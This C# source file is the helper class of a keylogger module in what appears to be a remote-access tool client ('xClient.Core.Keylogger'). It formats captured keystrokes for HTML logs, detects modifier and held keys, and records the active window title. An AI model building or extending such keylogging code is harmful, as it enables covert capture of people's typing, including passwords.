using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

namespace xClient.Core.Keylogger
{
    public static class LoggerHelper
    {
        #region "Extension Methods"
        public static bool IsModifierKeysSet(this List<Keys> pressedKeys)
        {
            return pressedKeys != null &&
                (pressedKeys.Contains(Keys.LControlKey)
                || pressedKeys.Contains(Keys.RControlKey)
                || pressedKeys.Contains(Keys.LMenu)
                || pressedKeys.Contains(Keys.RMenu)
                || pressedKeys.Contains(Keys.LWin)
                || pressedKeys.Contains(Keys.RWin)
                || pressedKeys.Contains(Keys.Control)
                || pressedKeys.Contains(Keys.Alt));
        }

        public static bool IsExcludedKey(this Keys k)
        {
            return (!(k >= Keys.A && k <= Keys.Z
                      || k >= Keys.NumPad0 && k <= Keys.Divide
                      || k >= Keys.D0 && k <= Keys.D9
                      || k >= Keys.Oem1 && k <= Keys.OemClear
                      || k >= Keys.LShiftKey && k <= Keys.RShiftKey
                      || k == Keys.CapsLock
                      || k == Keys.Space));
        }
        #endregion

        public static bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        public static string Filter(char key)
        {
            if ((int)key < 32) return string.Empty;

            switch (key)
            {
                case '<':
                    return "&lt;";
                case '>':
                    return "&gt;";
                case '#':
                    return "&#35;";
                case '&':
                    return "&amp;";
                case '"':
                    return "&quot;";
                case '\'':
                    return "&apos;";
                case ' ':
                    return "&nbsp;";
            }
            return key.ToString();
        }

        public static string GetDisplayName(Keys key, bool altGr = false)
        {
            string name = key.ToString();
            if (name.Contains("ControlKey"))
                return "Control";
            else if (name.Contains("Menu"))
                return "Alt";
            else if (name.Contains("Win"))
                return "Win";
            else if (name.Contains("Shift"))
                return "Shift";
            return name;
        }

        public static string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            WinApi.ThreadNativeMethods.GetWindowText(WinApi.ThreadNativeMethods.GetForegroundWindow(), sbTitle,
                sbTitle.Capacity);

            string title = sbTitle.ToString();

            return (!string.IsNullOrEmpty(title)) ? title : null;
        }
    }
}
